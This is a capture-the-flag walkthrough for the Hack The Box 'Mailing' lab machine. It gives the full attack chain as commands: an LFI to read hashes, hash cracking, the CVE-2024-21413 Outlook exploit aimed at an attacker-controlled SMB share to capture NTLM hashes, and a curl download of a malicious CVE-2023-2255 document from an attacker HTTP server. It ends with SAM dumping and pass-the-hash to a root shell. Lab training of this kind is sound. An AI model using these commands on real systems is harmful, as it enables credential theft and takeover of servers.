# Mailing HTB Writeup

## Step 1: Scanning the open ports using NMAP 
```sh
nmap -sV -p- -A -sC 10.10.11.14
```
You will find out there are several port are open such as 25/TCP 80/TCP and many more.

## Step 2: Adding a domain name to `/etc/hosts`
```sh
sudo nano /etc/hosts 
```
Add the IP address:
```plaintext
10.10.11.14    mailing.htb
```

## Step 3: Open the webpage
```plaintext
http://10.10.11.14/
```

## Step 4: Scan the directories using dirsearch
Dirsearch tool is designed to brute force directories and files in webserver.
```sh
dirsearch –u http://mailing.htb/ -x 403404400
```
- `-u` -> the target URL to scan
- `-x` -> The status codes to exclude from the results i.e. 403 (forbidden) 404 (Not Found) 400 (Bad Request).

You will get `download.php` file. Let's try to download it and see what we get while we intercept using BURPSUITE tool. We should add a file parameter through which we can read the server configuration file using LFI. Inside we find the hashes. We can easily find out the AdministratorPassword in Hashes. Copy those hashes.

## Step 5: Crack the admin password using the hash code we got
We will be using hashcat over here.
```sh
hashcat –a 0 –m 0 <hash code> /usr/share/wordlist/rockyou.txt
```
Once the password is cracked you will see the password in the output section, i.e. `homenetworkingadministrator`.

## Step 6: Find the proper CVE which could help us in capturing user hash
```plaintext
https://github.com/xaitax/CVE-2024-21413-Microsoft-Outlook-Remote-Code-Execution-Vulnerability?tab=readme-ov-file
```
```sh
git clone <above url>
```
**NOTE:** Before using the exploit of the above-mentioned CVE don’t forget to turn on responder.

## Step 7: Use the exploit to send mail
```sh
python3 CVE-2024-21413.py –server mailing.htb –port 587 –username administrator@mailing.htb –password homenetworkingadministrator –sender administrator@mailing.htb –recipient maya@mailing.htb –url \\<IP address tun0>\test\meeting –subject “sd”
```
After executing this command you will get the user hash. Copy the user hash.

## Step 8: Crack the password using hashcat
```sh
hashcat –a 0 –m 5600 <hash code> /usr/share/wordlist/rockyou.txt
```
In the output, you will find out the password, i.e. `m4y4ngs4ri`.

## Step 9: Connect to powershell using evil-winrm
Since we got the user credentials of maya and in the above nmap scan, we saw port 5985 open.
```sh
evil-winrm –i 10.10.11.14 –u maya –p m4y4ngs4ri 
```
You will easily get the user flag.
```sh
cat user.txt
```

## Step 10: For root flag, find the libreoffice file version
```sh
type readme_en-US.txt
```
There is an exploit available for giving administrator privileges to the users.
```sh
git clone https://github.com/elweth-sec/CVE-2023-2255
```
**NOTE:** Cloning in the host machine.

## Step 11: Create an exploit to give maya admin access
```sh
python3 CVE-2023-2255.py –cmd ‘net localgroup Administradores maya /add’ –output ‘exploit.odt’
```
Once the exploit is created, transfer this exploit to our powershell.
```sh
sudo python3 –m http.server 4444 
```
**NOTE:** Creating an HTTP server should be done in the host machine.
```sh
curl –o exploit.odt <IP address>:4444/exploit.odt
```
**NOTE:** Curl command should be used in the target machine.

## Step 12: Check user groups before running the exploit
```sh
net users maya
```

## Step 13: Run the exploit and check user group again
```sh
./exploit.odt
net user maya
```

## Step 14: Get the local admin hash using crackmapexec
```sh
crackmapexec smb 10.10.11.14 –u maya –p "m4y4ngs4ri" –sam
```

## Step 15: Use the local admin hash for remote connection to the host as a root
```sh
impacket-wmiexec localadmin@10.10.11.14 -hashes <local admin hash>
```
You will find the root flag.
